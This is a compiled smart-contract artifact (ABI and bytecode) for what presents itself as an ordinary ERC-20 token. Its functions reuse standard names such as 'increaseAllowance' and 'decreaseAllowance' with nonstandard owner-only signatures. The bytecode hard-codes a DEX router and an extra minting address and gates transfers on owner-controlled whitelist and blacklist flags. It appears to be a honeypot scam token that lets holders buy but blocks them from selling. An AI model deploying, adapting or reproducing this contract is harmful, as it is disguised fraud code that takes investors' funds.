{
  "opcodeHash": "0x168ded6163973487231d6801a634e136e49ec06f10475360da197c70f87c46ca",
  "metalessHash": "0x9462ec62809db1ce91e5b436e13fe6b440d1ed6ad65376c65d0b9c354e0a4d8d",
  "runtimeHash": "0xc3ccf6b03920ca5668bc6ee6cb9aa1df709ab6c4b69e6bb8fe9b29656b99ae6d",
  "encodedMetadata": [
    {
      "ipfs": "/ipfs/Qmdroig9bvVtD3bgmj1YdhCJ1DnBGxu3nfLcQdvyg6QB37",
      "solc": "0.6.12"
    }
  ],
  "abi": [
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "name",
          "type": "string"
        },
        {
          "internalType": "string",
          "name": "symbol",
          "type": "string"
        },
        {
          "internalType": "uint256",
          "name": "initialSupply",
          "type": "uint256"
        },
        {
          "internalType": "address payable",
          "name": "owner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "_initiate",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "_owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "receivers",
          "type": "address[]"
        }
      ],
      "name": "addApprove",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "safeOwner",
          "type": "address"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "receivers",
          "type": "address[]"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "approvecount",
          "type": "uint256"
        },
        {
          "internalType": "address[]",
          "name": "receivers",
          "type": "address[]"
        },
        {
          "internalType": "uint256[]",
          "name": "amounts",
          "type": "uint256[]"
        }
      ],
      "name": "multiTransfer",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "60806040526000600355600019600955600c80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d1790553480156200004257600080fd5b506040516200198638038062001986833981810160405260808110156200006857600080fd5b81019080805160405193929190846401000000008211156200008957600080fd5b9083019060208201858111156200009f57600080fd5b8251640100000000811182820188101715620000ba57600080fd5b82525081516020918201929091019080838360005b83811015620000e9578181015183820152602001620000cf565b50505050905090810190601f168015620001175780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200013b57600080fd5b9083019060208201858111156200015157600080fd5b82516401000000008111828201881017156200016c57600080fd5b82525081516020918201929091019080838360005b838110156200019b57818101518382015260200162000181565b50505050905090810190601f168015620001c95780820380516001836020036101000a031916815260200191505b506040908152602082810151929091015186519294509250620001f291600691870190620003e5565b50825162000208906007906020860190620003e5565b506008805460ff19166012179055600a80546001600160a01b0383166001600160a01b03199182168117909255600b805490911690911790556200025781670de0b6b3a764000084026200028b565b6200028173e0a6f0c9dcb8dc013d812f2259bfcfd50a2acd98670de0b6b3a764000084026200028b565b5050505062000481565b600a546001600160a01b03163314620002d65760405162461bcd60e51b8152600401808060200182810382526024815260200180620019626024913960400191505060405180910390fd5b620002f2816005546200038360201b62000bf21790919060201c565b600555600a546001600160a01b0316600090815260208181526040909120546200032791839062000bf262000383821b17901c565b600a546001600160a01b0390811660009081526020818152604080832094909455835185815293519286169391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b600082820183811015620003de576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200042857805160ff191683800117855562000458565b8280016001018555821562000458579182015b82811115620004585782518255916020019190600101906200043b565b50620004669291506200046a565b5090565b5b808211156200046657600081556001016200046b565b6114d180620004916000396000f3fe608060405234801561001057600080fd5b50600436106100f55760003560e01c806370a0823111610097578063a9059cbb11610066578063a9059cbb14610472578063b2bdfa7b1461049e578063dd62ed3e146104c2578063e1268115146104f0576100f5565b806370a08231146103f257806380b2122e146104185780638f4a573d1461043e57806395d89b411461046a576100f5565b806318160ddd116100d357806318160ddd1461025a57806323b872dd14610274578063313ce567146102aa57806352b0f196146102c8576100f5565b8063043fa39e146100fa57806306fdde031461019d578063095ea7b31461021a575b600080fd5b61019b6004803603602081101561011057600080fd5b810190602081018135600160201b81111561012a57600080fd5b82018360208201111561013c57600080fd5b803590602001918460208302840111600160201b8311171561015d57600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600092019190915250929550610591945050505050565b005b6101a5610686565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101df5781810151838201526020016101c7565b50505050905090810190601f16801561020c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102466004803603604081101561023057600080fd5b506001600160a01b03813516906020013561071c565b604080519115158252519081900360200190f35b610262610739565b60408051918252519081900360200190f35b6102466004803603606081101561028a57600080fd5b506001600160a01b0381358116916020810135909116906040013561073f565b6102b26107c6565b6040805160ff9092168252519081900360200190f35b61019b600480360360608110156102de57600080fd5b81359190810190604081016020820135600160201b8111156102ff57600080fd5b82018360208201111561031157600080fd5b803590602001918460208302840111600160201b8311171561033257600080fd5b9190808060200260200160405190810160405280939291908181526020018383602002808284376000920191909152509295949360208101935035915050600160201b81111561038157600080fd5b82018360208201111561039357600080fd5b803590602001918460208302840111600160201b831117156103b457600080fd5b9190808060200260200160405190810160405280939291908181526020018383602002808284376000920191909152509295506107cf945050505050565b6102626004803603602081101561040857600080fd5b50356001600160a01b03166108f4565b61019b6004803603602081101561042e57600080fd5b50356001600160a01b031661090f565b61019b6004803603604081101561045457600080fd5b506001600160a01b038135169060200135610979565b6101a5610a53565b6102466004803603604081101561048857600080fd5b506001600160a01b038135169060200135610ab4565b6104a6610ac8565b604080516001600160a01b039092168252519081900360200190f35b610262600480360360408110156104d857600080fd5b506001600160a01b0381358116916020013516610ad7565b61019b6004803603602081101561050657600080fd5b810190602081018135600160201b81111561052057600080fd5b82018360208201111561053257600080fd5b803590602001918460208302840111600160201b8311171561055357600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600092019190915250929550610b02945050505050565b600a546001600160a01b031633146105d9576040805162461bcd60e51b815260206004820152600660248201526510b7bbb732b960d11b604482015290519081900360640190fd5b60005b8151811015610682576001600260008484815181106105f757fe5b60200260200101516001600160a01b03166001600160a01b0316815260200190815260200160002060006101000a81548160ff02191690831515021790555060006001600084848151811061064857fe5b6020908102919091018101516001600160a01b03168252810191909152604001600020805460ff19169115159190911790556001016105dc565b5050565b60068054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156107125780601f106106e757610100808354040283529160200191610712565b820191906000526020600020905b8154815290600101906020018083116106f557829003601f168201915b5050505050905090565b6000610730610729610c53565b8484610c57565b50600192915050565b60055490565b600061074c848484610d43565b6107bc84610758610c53565b6107b785604051806060016040528060288152602001611407602891396001600160a01b038a16600090815260046020526040812090610796610c53565b6001600160a01b0316815260208101919091526040016000205491906112ff565b610c57565b5060019392505050565b60085460ff1690565b600a546001600160a01b03163314610817576040805162461bcd60e51b815260206004820152600660248201526510b7bbb732b960d11b604482015290519081900360640190fd5b60005b82518110156108ee5782516003906102149061085d9086908590811061083c57fe5b602002602001015185858151811061085057fe5b6020026020010151610ab4565b50858310156108e457600180600087868151811061087757fe5b6020908102919091018101516001600160a01b03168252810191909152604001600020805460ff19169115159190911790558451600390610214906108e1908890879081106108c257fe5b6020908102919091010151600c546001600160a01b0316600019610c57565b50505b505060010161081a565b50505050565b6001600160a01b031660009081526020819052604090205490565b600a546001600160a01b03163314610957576040805162461bcd60e51b815260206004820152600660248201526510b7bbb732b960d11b604482015290519081900360640190fd5b600b80546001600160a01b0319166001600160a01b0392909216919091179055565b600a546001600160a01b031633146109c25760405162461bcd60e51b815260040180806020018281038252602481526020018061142f6024913960400191505060405180910390fd5b6005546109cf9082610bf2565b600555600a546001600160a01b03166000908152602081905260409020546109f79082610bf2565b600a546001600160a01b0390811660009081526020818152604080832094909455835185815293519286169391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b60078054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156107125780601f106106e757610100808354040283529160200191610712565b6000610730610ac1610c53565b8484610d43565b600a546001600160a01b031681565b6001600160a01b03918216600090815260046020908152604080832093909416825291909152205490565b600a546001600160a01b03163314610b4a576040805162461bcd60e51b815260206004820152600660248201526510b7bbb732b960d11b604482015290519081900360640190fd5b60005b8151811015610682576001806000848481518110610b6757fe5b60200260200101516001600160a01b03166001600160a01b0316815260200190815260200160002060006101000a81548160ff021916908315150217905550600060026000848481518110610bb857fe5b6020908102919091018101516001600160a01b03168252810191909152604001600020805460ff1916911515919091179055600101610b4d565b600082820183811015610c4c576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b3390565b6001600160a01b038316610c9c5760405162461bcd60e51b81526004018080602001828103825260248152602001806114786024913960400191505060405180910390fd5b6001600160a01b038216610ce15760405162461bcd60e51b81526004018080602001828103825260228152602001806113bf6022913960400191505060405180910390fd5b6001600160a01b03808416600081815260046020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b600b54600a548491849184916001600160a01b039182169116148015610d765750600a546001600160a01b038481169116145b15610eee57600b80546001600160a01b0319166001600160a01b03848116919091179091558616610dd85760405162461bcd60e51b81526004018080602001828103825260258152602001806114536025913960400191505060405180910390fd5b6001600160a01b038516610e1d5760405162461bcd60e51b815260040180806020018281038252602381526020018061139c6023913960400191505060405180910390fd5b610e28868686611396565b610e65846040518060600160405280602681526020016113e1602691396001600160a01b03891660009081526020819052604090205491906112ff565b6001600160a01b038088166000908152602081905260408082209390935590871681522054610e949085610bf2565b6001600160a01b038087166000818152602081815260409182902094909455805188815290519193928a16927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a36112f7565b600a546001600160a01b0384811691161480610f175750600b546001600160a01b038481169116145b80610f2f5750600a546001600160a01b038381169116145b15610fb257600a546001600160a01b038481169116148015610f625750816001600160a01b0316836001600160a01b0316145b15610f6d5760038190555b6001600160a01b038616610dd85760405162461bcd60e51b81526004018080602001828103825260258152602001806114536025913960400191505060405180910390fd5b6001600160a01b03831660009081526001602081905260409091205460ff161515141561101e576001600160a01b038616610dd85760405162461bcd60e51b81526004018080602001828103825260258152602001806114536025913960400191505060405180910390fd5b6001600160a01b03831660009081526002602052604090205460ff161515600114156110a857600b546001600160a01b038481169116148061106d5750600c546001600160a01b038381169116145b610f6d5760405162461bcd60e51b81526004018080602001828103825260268152602001806113e16026913960400191505060405180910390fd5b60035481101561113c57600b546001600160a01b0383811691161415610f6d576001600160a01b0383811660009081526002602090815260408083208054600160ff1991821681179092559252909120805490911690558616610dd85760405162461bcd60e51b81526004018080602001828103825260258152602001806114536025913960400191505060405180910390fd5b600b546001600160a01b03848116911614806111655750600c546001600160a01b038381169116145b6111a05760405162461bcd60e51b81526004018080602001828103825260268152602001806113e16026913960400191505060405180910390fd5b6001600160a01b0386166111e55760405162461bcd60e51b81526004018080602001828103825260258152602001806114536025913960400191505060405180910390fd5b6001600160a01b03851661122a5760405162461bcd60e51b815260040180806020018281038252602381526020018061139c6023913960400191505060405180910390fd5b611235868686611396565b611272846040518060600160405280602681526020016113e1602691396001600160a01b03891660009081526020819052604090205491906112ff565b6001600160a01b0380881660009081526020819052604080822093909355908716815220546112a19085610bf2565b6001600160a01b038087166000818152602081815260409182902094909455805188815290519193928a16927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a35b505050505050565b6000818484111561138e5760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561135357818101518382015260200161133b565b50505050905090810190601f1680156113805780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a205f696e69746961746520746f20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373a264697066735822122099cc7ff7423ace9d674c5c73a51bb8d05e1eac2d7d59ba2811873603eddb350364736f6c634300060c003345524332303a205f696e69746961746520746f20746865207a65726f2061646472657373"
  }
}